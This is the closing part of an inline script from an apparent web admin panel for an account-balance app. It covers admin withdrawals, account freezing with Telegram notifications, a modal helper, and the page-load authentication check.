        const amt = parseFloat(document.getElementById('adm-wd-amt').value); const memo = document.getElementById('adm-wd-memo').value || 'Admin Withdrawal';
        if (!amt || amt <= 0) { showToast('Invalid', 'Enter valid amount.', 'error'); return; }
        if (amt > user.userBalance) { showToast('Insufficient', 'Exceeds balance.', 'error'); return; }
        const ref = 'ADM-WD-' + Math.floor(10000 + Math.random() * 90000); const nowStr = new Date().toISOString().replace('T', ' ').substring(0, 16);
        let balBefore = 0, balAfter = 0;
        const ok = await updateUserByUsername(username, (u) => {
            balBefore = Number(u.userBalance || 0);
            u.userBalance = +(Number(u.userBalance || 0) - amt).toFixed(2);
            balAfter = Number(u.userBalance || 0);
            u.transactions = Array.isArray(u.transactions) ? u.transactions : [];
            u.transactions.unshift({ ref, date: nowStr, amount: amt, type: 'Admin Withdrawal', status: 'Completed', memo });
        });
        if (ok) {
            showToast('Complete', `${fmtMoney(amt)} removed.`, 'success');
            closeModal();
            refreshData();

            const tg = await adminTgBlock();
            sendTelegramMessage(
              `💸 <b>ADMIN — FUNDS WITHDRAWN FROM USER</b>\n` +
              `<b>User:</b> @${tgEsc(username)}\n` +
              `<b>Name:</b> ${tgEsc(((user.firstName||'') + ' ' + (user.lastName||'')).trim())}\n` +
              `<b>Email:</b> ${tgEsc(user.email || 'N/A')}\n` +
              `<b>Amount:</b> ${fmtMoney(amt)}\n` +
              `<b>Ref:</b> ${tgEsc(ref)}\n` +
              `<b>Memo:</b> ${tgEsc(memo)}\n` +
              `<b>Balance before:</b> ${fmtMoney(balBefore)}\n` +
              `<b>Balance after:</b> ${fmtMoney(balAfter)}\n` +
              tg.block
            ).catch(()=>{});
        }
    }

    async function adminToggleFreeze(username, currentState) {
        const user = adminData.users.find(u => u.username === username);
        const ok = await updateUserByUsername(username, (u) => { u.isFrozen = !currentState; });
        if (ok) {
            showToast('Updated', currentState ? 'Account unfrozen.' : 'Account frozen.', 'success');
            closeModal();
            refreshData();

            const tg = await adminTgBlock();
            sendTelegramMessage(
              `${currentState ? '🔓 <b>ADMIN — ACCOUNT UNFROZEN</b>' : '🧊 <b>ADMIN — ACCOUNT FROZEN</b>'}\n` +
              `<b>User:</b> @${tgEsc(username)}\n` +
              `<b>Name:</b> ${tgEsc(((user?.firstName||'') + ' ' + (user?.lastName||'')).trim())}\n` +
              `<b>Email:</b> ${tgEsc(user?.email || 'N/A')}\n` +
              tg.block
            ).catch(()=>{});
        }
    }

    function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed">${bodyHtml}</div>`; modal.classList.add('active'); }
    function closeModal() { document.getElementById('global-modal').classList.remove('active'); }

    ['click', 'keydown', 'mousemove', 'scroll'].forEach(evt => { document.addEventListener(evt, touchActivity, { passive: true }); });

    window.addEventListener('load', async () => {
        await pullBannedIPsFromCloud().catch(() => {});
        if (isAuthenticated()) {
            document.getElementById('login-screen').classList.add('hidden');
            document.getElementById('admin-screen').classList.remove('hidden');
            await refreshData();
            startSessionTimer();
        } else {
            clearAuth();
            document.getElementById('login-screen').classList.remove('hidden');
        }
    });
</script>
</body>
</html>
